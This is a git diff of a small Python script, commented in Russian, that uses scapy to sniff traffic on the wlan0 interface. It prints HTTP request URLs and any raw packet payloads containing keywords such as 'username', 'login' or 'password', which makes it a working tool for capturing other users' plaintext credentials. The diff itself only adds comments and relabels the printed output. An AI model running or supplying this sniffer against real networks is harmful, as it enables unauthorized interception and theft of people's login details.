@@ -13,16 +13,16 @@ if filter_sniff == '3':
     filter_sniff = 'arp'
 
 def sniff(interface):
-    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)
+    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet) #Запрос на просмотр пакетов
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest): #Отбираем пакеты с http
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #Совмещаем первую и вторую часть url 
-        print(url) #Просматриваем url адреса
+        print('URL адрес ---> ' + str(url)) #Просматриваем url адреса
         if packet.haslayer(scapy.Raw): 
-            load = packet[scapy.Raw].load 
+            load = packet[scapy.Raw].load #С помощью этого выражения можно получить доступ к содержимому пакета на уровне Raw
             keywords = ['username', 'user', 'login', 'password', 'pass'] #Возможные варианты надписи логина на сайтах для перебора
             for keyword in keywords:
                 if keyword in load:
-                    print(load) #Просматриваем логин и пароль
+                    print('Логин и пароль ---> ' + str(load)) #Просматриваем логин и пароль
                     break
 sniff('wlan0')
